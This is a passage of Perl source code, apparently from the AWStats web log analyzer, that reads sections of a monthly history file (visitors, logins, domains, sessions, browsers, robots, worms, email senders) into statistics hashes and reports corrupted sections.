                        "History file \"$filetoread\" is corrupted (End of section DAY not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of DAY section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'day'};

                # WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
                #if ($SectionsToSave{'day'}) {	# Must be made after read of visitor
                #	Save_History('day',$year,$month,$date); delete $SectionsToSave{'day'};
                #	if ($withpurge) { %DayPages=(); %DayHits=(); %DayBytes=(); %DayVisits=(); }
                #}
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_VISITOR
            if ( $field[0] eq 'BEGIN_VISITOR' ) {
                if ($Debug) { debug(" Begin of VISITOR section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;

                        # For backward compatibility
                        if ($readvisitorforbackward) {
                            if ( $field[1] ) {
                                $MonthUnique{ $year . $month }++;
                            }
                            if ( $MonthRequired ne 'all' ) {
                                if (   $field[0] !~ /^\d+\.\d+\.\d+\.\d+$/
                                    && $field[0] !~ /^[0-9A-F]*:/i )
                                {
                                    $MonthHostsKnown{ $year . $month }++;
                                }
                                else { $MonthHostsUnknown{ $year . $month }++; }
                            }
                        }

                        # Process data saved in 'wait' arrays
                        if ( $withupdate && $_waithost_e{ $field[0] } ) {
                            my $timehostl = int( $field[4] || 0 );
                            my $timehosts = int( $field[5] || 0 );
                            my $newtimehosts = (
                                $_waithost_s{ $field[0] }
                                    ? $_waithost_s{ $field[0] }
                                    : $_host_s{ $field[0] }
                            );
                            my $newtimehostl = (
                                $_waithost_l{ $field[0] }
                                    ? $_waithost_l{ $field[0] }
                                    : $_host_l{ $field[0] }
                            );
                            if ( $newtimehosts > $timehostl + $VISITTIMEOUT ) {
                                if ($Debug) {
                                    debug(
                                        " Visit for $field[0] in 'wait' arrays is a new visit different than last in history",
                                        4
                                    );
                                }
                                if ( $field[6] ) { $_url_x{ $field[6] }++; }
                                $_url_e{ $_waithost_e{ $field[0] } }++;
                                $newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
                                $DayVisits{$1}++;
                                if ( $timehosts && $timehostl ) {
                                    $_session{
                                        GetSessionRange( $timehosts,
                                            $timehostl )
                                    }++;
                                }
                                if ( $_waithost_s{ $field[0] } ) {

                                    # First session found in log was followed by another one so it's finished
                                    $_session{
                                        GetSessionRange( $newtimehosts,
                                            $newtimehostl )
                                    }++;
                                }

                                # Here $_host_l $_host_s and $_host_u are correctly defined
                            }
                            else {
                                if ($Debug) {
                                    debug(
                                        " Visit for $field[0] in 'wait' arrays is following of last visit in history",
                                        4
                                    );
                                }
                                if ( $_waithost_s{ $field[0] } ) {

                                    # First session found in log was followed by another one so it's finished
                                    $_session{
                                        GetSessionRange(
                                            MinimumButNoZero(
                                                $timehosts, $newtimehosts
                                            ),
                                            $timehostl > $newtimehostl
                                                ? $timehostl
                                                : $newtimehostl
                                        )
                                    }++;

                                    # Here $_host_l $_host_s and $_host_u are correctly defined
                                }
                                else {

                                    # We correct $_host_l $_host_s and $_host_u
                                    if ( $timehostl > $newtimehostl ) {
                                        $_host_l{ $field[0] } = $timehostl;
                                        $_host_u{ $field[0] } = $field[6];
                                    }
                                    if ( $timehosts < $newtimehosts ) {
                                        $_host_s{ $field[0] } = $timehosts;
                                    }
                                }
                            }
                            delete $_waithost_e{ $field[0] };
                            delete $_waithost_l{ $field[0] };
                            delete $_waithost_s{ $field[0] };
                            delete $_waithost_u{ $field[0] };
                        }

                        # Load records
                        if (   $readvisitorforbackward != 2
                            && $SectionsToLoad{'visitor'} )
                        {    # if readvisitorforbackward==2 we do not load
                            my $loadrecord = 0;
                            if ($withupdate) {
                                $loadrecord = 1;
                            }
                            else {
                                if (   $HTMLOutput{'allhosts'}
                                    || $HTMLOutput{'lasthosts'} )
                                {
                                    if (
                                        (
                                            !$FilterIn{'host'}
                                                || $field[0] =~ /$FilterIn{'host'}/i
                                        )
                                            && ( !$FilterEx{'host'}
                                            || $field[0] !~
                                            /$FilterEx{'host'}/i )
                                    )
                                    {
                                        $loadrecord = 1;
                                    }
                                }
                                elsif ($MonthRequired eq 'all'
                                    || $field[2] >= $MinHit{'Host'} )
                                {
                                    if (
                                        $HTMLOutput{'unknownip'}
                                            && ( $field[0] =~ /^\d+\.\d+\.\d+\.\d+$/
                                            || $field[0] =~ /^[0-9A-F]*:/i )
                                    )
                                    {
                                        $loadrecord = 1;
                                    }
                                    elsif (
                                        $HTMLOutput{'main'}
                                            && (   $MonthRequired eq 'all'
                                            || $countloaded <
                                            $MaxNbOf{'HostsShown'} )
                                    )
                                    {
                                        $loadrecord = 1;
                                    }
                                }
                            }
                            if ($loadrecord) {
                                if ( $field[1] ) {
                                    $_host_p{ $field[0] } += $field[1];
                                }
                                if ( $field[2] ) {
                                    $_host_h{ $field[0] } += $field[2];
                                }
                                if ( $field[3] ) {
                                    $_host_k{ $field[0] } += $field[3];
                                }
                                if ( $field[4] && !$_host_l{ $field[0] } )
                                { # We save last connexion params if not previously defined
                                    $_host_l{ $field[0] } = int( $field[4] );
                                    if ($withupdate)
                                    { # field[5] field[6] are used only for update
                                        if ( $field[5]
                                            && !$_host_s{ $field[0] } )
                                        {
                                            $_host_s{ $field[0] } =
                                                int( $field[5] );
                                        }
                                        if ( $field[6]
                                            && !$_host_u{ $field[0] } )
                                        {
                                            $_host_u{ $field[0] } = $field[6];
                                        }
                                    }
                                }
                                $countloaded++;
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_VISITOR'
                    || $field[0] eq "${xmleb}END_VISITOR"
                    || !$_ );
                if (   $field[0] ne 'END_VISITOR'
                    && $field[0] ne "${xmleb}END_VISITOR" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section VISITOR not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of VISITOR section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'visitor'};

                # WE DO NOT SAVE SECTION NOW TO BE SURE TO HAVE THIS LARGE SECTION NOT AT THE BEGINNING OF FILE
                #if ($SectionsToSave{'visitor'}) {
                #	Save_History('visitor',$year,$month,$date); delete $SectionsToSave{'visitor'};
                #	if ($withpurge) { %_host_p=(); %_host_h=(); %_host_k=(); %_host_l=(); %_host_s=(); %_host_u=(); }
                #}
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_UNKNOWNIP for backward compatibility
            if ( $field[0] eq 'BEGIN_UNKNOWNIP' ) {
                my %iptomigrate = ();
                if ($Debug) { debug(" Begin of UNKNOWNIP section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'unknownip'} ) {
                            $iptomigrate{ $field[0] } = $field[1] || 0;
                            $countloaded++;
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_UNKNOWNIP'
                    || $field[0] eq "${xmleb}END_UNKNOWNIP"
                    || !$_ );
                if (   $field[0] ne 'END_UNKNOWNIP'
                    && $field[0] ne "${xmleb}END_UNKNOWNIP" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section UNKOWNIP not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of UNKOWNIP section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'visitor'};

                # THIS SECTION IS NEVER SAVED. ONLY READ FOR MIGRATE AND CONVERTED INTO VISITOR SECTION
                foreach ( keys %iptomigrate ) {
                    $_host_p{$_} += int( $_host_p{'Unknown'} / $countloaded );
                    $_host_h{$_} += int( $_host_h{'Unknown'} / $countloaded );
                    $_host_k{$_} += int( $_host_k{'Unknown'} / $countloaded );
                    if ( $iptomigrate{$_} > 0 ) {
                        $_host_l{$_} = $iptomigrate{$_};
                    }
                }
                delete $_host_p{'Unknown'};
                delete $_host_h{'Unknown'};
                delete $_host_k{'Unknown'};
                delete $_host_l{'Unknown'};
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_LOGIN
            if ( $field[0] eq 'BEGIN_LOGIN' ) {
                if ($Debug) { debug(" Begin of LOGIN section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'login'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_login_p{ $field[0] } += $field[1];
                            }
                            if ( $field[2] ) {
                                $_login_h{ $field[0] } += $field[2];
                            }
                            if ( $field[3] ) {
                                $_login_k{ $field[0] } += $field[3];
                            }
                            if ( !$_login_l{ $field[0] } && $field[4] ) {
                                $_login_l{ $field[0] } = int( $field[4] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_LOGIN'
                    || $field[0] eq "${xmleb}END_LOGIN"
                    || !$_ );
                if (   $field[0] ne 'END_LOGIN'
                    && $field[0] ne "${xmleb}END_LOGIN" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section LOGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of LOGIN section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'login'};
                if ( $SectionsToSave{'login'} ) {
                    Save_History( 'login', $year, $month, $date );
                    delete $SectionsToSave{'login'};
                    if ($withpurge) {
                        %_login_p = ();
                        %_login_h = ();
                        %_login_k = ();
                        %_login_l = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_DOMAIN
            if ( $field[0] eq 'BEGIN_DOMAIN' ) {
                if ($Debug) { debug(" Begin of DOMAIN section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'domain'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_domener_p{ $field[0] } += $field[1];
                            }
                            if ( $field[2] ) {
                                $_domener_h{ $field[0] } += $field[2];
                            }
                            if ( $field[3] ) {
                                $_domener_k{ $field[0] } += $field[3];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_DOMAIN'
                    || $field[0] eq "${xmleb}END_DOMAIN"
                    || !$_ );
                if (   $field[0] ne 'END_DOMAIN'
                    && $field[0] ne "${xmleb}END_DOMAIN" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section DOMAIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of DOMAIN section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'domain'};
                if ( $SectionsToSave{'domain'} ) {
                    Save_History( 'domain', $year, $month, $date );
                    delete $SectionsToSave{'domain'};
                    if ($withpurge) {
                        %_domener_p = ();
                        %_domener_h = ();
                        %_domener_k = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_SESSION
            if ( $field[0] eq 'BEGIN_SESSION' ) {
                if ($Debug) { debug(" Begin of SESSION section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'session'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_session{ $field[0] } += $field[1];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_SESSION'
                    || $field[0] eq "${xmleb}END_SESSION"
                    || !$_ );
                if (   $field[0] ne 'END_SESSION'
                    && $field[0] ne "${xmleb}END_SESSION" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section SESSION not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of SESSION section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'session'};

                # WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
                #if ($SectionsToSave{'session'}) {
                #	Save_History('session',$year,$month,$date); delete $SectionsToSave{'session'}; }
                #	if ($withpurge) { %_session=(); }
                #}
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_OS
            if ( $field[0] eq 'BEGIN_OS' ) {
                if ($Debug) { debug(" Begin of OS section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'os'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_os_h{ $field[0] } += $field[1];
                                $_os_p{ $field[0] } += $field[2];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_OS'
                    || $field[0] eq "${xmleb}END_OS"
                    || !$_ );
                if ( $field[0] ne 'END_OS' && $field[0] ne "${xmleb}END_OS" ) {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section OS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of OS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'os'};
                if ( $SectionsToSave{'os'} ) {
                    Save_History( 'os', $year, $month, $date );
                    delete $SectionsToSave{'os'};
                    if ($withpurge) { %_os_h = (); %_os_p = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_BROWSER
            if ( $field[0] eq 'BEGIN_BROWSER' ) {
                if ($Debug) { debug(" Begin of BROWSER section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'browser'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_browser_h{ $field[0] } += $field[1];
                                $_browser_p{ $field[0] } += $field[2];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_BROWSER'
                    || $field[0] eq "${xmleb}END_BROWSER"
                    || !$_ );
                if (   $field[0] ne 'END_BROWSER'
                    && $field[0] ne "${xmleb}END_BROWSER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section BROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of BROWSER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'browser'};
                if ( $SectionsToSave{'browser'} ) {
                    Save_History( 'browser', $year, $month, $date );
                    delete $SectionsToSave{'browser'};
                    if ($withpurge) { %_browser_h = (); %_browser_p = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_UNKNOWNREFERER
            if ( $field[0] eq 'BEGIN_UNKNOWNREFERER' ) {
                if ($Debug) { debug(" Begin of UNKNOWNREFERER section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'unknownreferer'} ) {
                            $countloaded++;
                            if ( !$_unknownreferer_l{ $field[0] } ) {
                                $_unknownreferer_l{ $field[0] } =
                                    int( $field[1] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_UNKNOWNREFERER'
                    || $field[0] eq "${xmleb}END_UNKNOWNREFERER"
                    || !$_ );
                if (   $field[0] ne 'END_UNKNOWNREFERER'
                    && $field[0] ne "${xmleb}END_UNKNOWNREFERER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of UNKNOWNREFERER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'unknownreferer'};
                if ( $SectionsToSave{'unknownreferer'} ) {
                    Save_History( 'unknownreferer', $year, $month, $date );
                    delete $SectionsToSave{'unknownreferer'};
                    if ($withpurge) { %_unknownreferer_l = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_UNKNOWNREFERERBROWSER
            if ( $field[0] eq 'BEGIN_UNKNOWNREFERERBROWSER' ) {
                if ($Debug) {
                    debug(" Begin of UNKNOWNREFERERBROWSER section");
                }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'unknownrefererbrowser'} ) {
                            $countloaded++;
                            if ( !$_unknownrefererbrowser_l{ $field[0] } ) {
                                $_unknownrefererbrowser_l{ $field[0] } =
                                    int( $field[1] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_UNKNOWNREFERERBROWSER'
                    || $field[0] eq "${xmleb}END_UNKNOWNREFERERBROWSER"
                    || !$_ );
                if (   $field[0] ne 'END_UNKNOWNREFERERBROWSER'
                    && $field[0] ne "${xmleb}END_UNKNOWNREFERERBROWSER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERERBROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'unknownrefererbrowser'};
                if ( $SectionsToSave{'unknownrefererbrowser'} ) {
                    Save_History( 'unknownrefererbrowser',
                        $year, $month, $date );
                    delete $SectionsToSave{'unknownrefererbrowser'};
                    if ($withpurge) { %_unknownrefererbrowser_l = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_SCREENSIZE
            if ( $field[0] eq 'BEGIN_SCREENSIZE' ) {
                if ($Debug) { debug(" Begin of SCREENSIZE section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'screensize'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_screensize_h{ $field[0] } += $field[1];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_SCREENSIZE'
                    || $field[0] eq "${xmleb}END_SCREENSIZE"
                    || !$_ );
                if (   $field[0] ne 'END_SCREENSIZE'
                    && $field[0] ne "${xmleb}END_SCREENSIZE" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section SCREENSIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of SCREENSIZE section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'screensize'};
                if ( $SectionsToSave{'screensize'} ) {
                    Save_History( 'screensize', $year, $month, $date );
                    delete $SectionsToSave{'screensize'};
                    if ($withpurge) { %_screensize_h = (); }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_ROBOT
            if ( $field[0] eq 'BEGIN_ROBOT' ) {
                if ($Debug) { debug(" Begin of ROBOT section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'robot'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_robot_h{ $field[0] } += $field[1];
                            }
                            $_robot_k{ $field[0] } += $field[2];
                            if ( !$_robot_l{ $field[0] } ) {
                                $_robot_l{ $field[0] } = int( $field[3] );
                            }
                            if ( $field[4] ) {
                                $_robot_r{ $field[0] } += $field[4];
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_ROBOT'
                    || $field[0] eq "${xmleb}END_ROBOT"
                    || !$_ );
                if (   $field[0] ne 'END_ROBOT'
                    && $field[0] ne "${xmleb}END_ROBOT" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section ROBOT not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of ROBOT section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'robot'};
                if ( $SectionsToSave{'robot'} ) {
                    Save_History( 'robot', $year, $month, $date );
                    delete $SectionsToSave{'robot'};
                    if ($withpurge) {
                        %_robot_h = ();
                        %_robot_k = ();
                        %_robot_l = ();
                        %_robot_r = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_WORMS
            if ( $field[0] eq 'BEGIN_WORMS' ) {
                if ($Debug) { debug(" Begin of WORMS section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'worms'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_worm_h{ $field[0] } += $field[1];
                            }
                            $_worm_k{ $field[0] } += $field[2];
                            if ( !$_worm_l{ $field[0] } ) {
                                $_worm_l{ $field[0] } = int( $field[3] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_WORMS'
                    || $field[0] eq "${xmleb}END_WORMS"
                    || !$_ );
                if (   $field[0] ne 'END_WORMS'
                    && $field[0] ne "${xmleb}END_WORMS" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section WORMS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of WORMS section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'worms'};
                if ( $SectionsToSave{'worms'} ) {
                    Save_History( 'worms', $year, $month, $date );
                    delete $SectionsToSave{'worms'};
                    if ($withpurge) {
                        %_worm_h = ();
                        %_worm_k = ();
                        %_worm_l = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_EMAILS
            if ( $field[0] eq 'BEGIN_EMAILSENDER' ) {
                if ($Debug) { debug(" Begin of EMAILSENDER section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'emailsender'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_emails_h{ $field[0] } += $field[1];
                            }
                            if ( $field[2] ) {
                                $_emails_k{ $field[0] } += $field[2];
                            }
                            if ( !$_emails_l{ $field[0] } ) {
                                $_emails_l{ $field[0] } = int( $field[3] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_EMAILSENDER'
                    || $field[0] eq "${xmleb}END_EMAILSENDER"
                    || !$_ );
                if (   $field[0] ne 'END_EMAILSENDER'
                    && $field[0] ne "${xmleb}END_EMAILSENDER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section EMAILSENDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of EMAILSENDER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'emailsender'};
                if ( $SectionsToSave{'emailsender'} ) {
                    Save_History( 'emailsender', $year, $month, $date );
                    delete $SectionsToSave{'emailsender'};
                    if ($withpurge) {
                        %_emails_h = ();
                        %_emails_k = ();
                        %_emails_l = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_EMAILR
            if ( $field[0] eq 'BEGIN_EMAILRECEIVER' ) {
                if ($Debug) { debug(" Begin of EMAILRECEIVER section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'emailreceiver'} ) {
                            $countloaded++;
                            if ( $field[1] ) {
                                $_emailr_h{ $field[0] } += $field[1];
                            }
                            if ( $field[2] ) {
                                $_emailr_k{ $field[0] } += $field[2];
                            }
                            if ( !$_emailr_l{ $field[0] } ) {
                                $_emailr_l{ $field[0] } = int( $field[3] );
                            }
                        }
                    }
                    $_ = <HISTORY>;
                    chomp $_;
                    s/\r//;
                    @field =
                        split( /\s+/,
                            ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
                    $countlines++;
                } until ( $field[0] eq 'END_EMAILRECEIVER'
                    || $field[0] eq "${xmleb}END_EMAILRECEIVER"
                    || !$_ );
                if (   $field[0] ne 'END_EMAILRECEIVER'
                    && $field[0] ne "${xmleb}END_EMAILRECEIVER" )
                {
                    error(
                        "History file \"$filetoread\" is corrupted (End of section EMAILRECEIVER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
                        "", "", 1
                    );
                }
                if ($Debug) {
                    debug(
                        " End of EMAILRECEIVER section ($count entries, $countloaded loaded)"
                    );
                }
                delete $SectionsToLoad{'emailreceiver'};
                if ( $SectionsToSave{'emailreceiver'} ) {
                    Save_History( 'emailreceiver', $year, $month, $date );
                    delete $SectionsToSave{'emailreceiver'};
                    if ($withpurge) {
                        %_emailr_h = ();
                        %_emailr_k = ();
                        %_emailr_l = ();
                    }
                }
                if ( !scalar %SectionsToLoad ) {
                    debug(" Stop reading history file. Got all we need.");
                    last;
                }
                next;
            }

            # BEGIN_SIDER
            if ( $field[0] eq 'BEGIN_SIDER' ) {
                if ($Debug) { debug(" Begin of SIDER section"); }
                $field[0] = '';
                my $count       = 0;
                my $countloaded = 0;
                do {
                    if ( $field[0] ) {
                        $count++;
                        if ( $SectionsToLoad{'sider'} ) {
                            my $loadrecord = 0;
                            if ($withupdate) {
                                $loadrecord = 1;
                            }
                            else {
                                if ( $HTMLOutput{'main'} ) {
                                    if ( $MonthRequired eq 'all' ) {
                                        $loadrecord = 1;
